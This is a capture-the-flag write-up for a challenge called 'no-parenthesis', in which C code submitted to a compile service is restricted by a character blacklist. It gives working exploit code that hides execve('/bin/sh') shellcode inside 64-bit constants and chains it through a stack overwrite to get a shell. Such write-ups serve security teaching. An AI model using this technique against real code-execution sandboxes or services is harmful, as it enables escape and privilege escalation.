# no-parenthesis

We are given `chall.py`, which allows us to provide C code that will be wrapped inside a `main` function and then compiled using gcc with the options `-Werror -Wall -O0`.

The challenge includes a blacklist: `{}()#%?` which eliminates function calls, casting, includes, important digraphs, and escaping from the main function.

On top of that, we're given a suid `readflag` binary which means that our goal is to get a shell and run `readflag`.

The idea to solve this challenge is to just use ROP and then use 64-bit consts to write out our own custom shellcode. We can get the addresses for our snippets of shellcode by using the double ampersand (`&&`) on a label name, and then adjusting the offset to be on our shellcode instead of the `movabs` instruction. You also have to be careful to not trigger any warnings, it's can get pretty annoying.

Here's the C code to achieve this:

```c
int main() {
    p1: long long a = 0xc33bb0c031; // xor eax, eax; mov al, 0x3b;
    long long* overflow[1];
    overflow[0]=&a;
    p2: a = 0x50f5fd231f631; // xor esi, esi; xor edx, edx; pop rdi; syscall;
    p3: a = 0x68732f6e69622f; // /bin/sh

    overflow[3] = &&p1 + 2;
    overflow[4] = &&p2 + 2;
    overflow[5] = &&p3 + 2;

    return **overflow;
}
```

Refer to [solve.py](solve.py) for the solution.
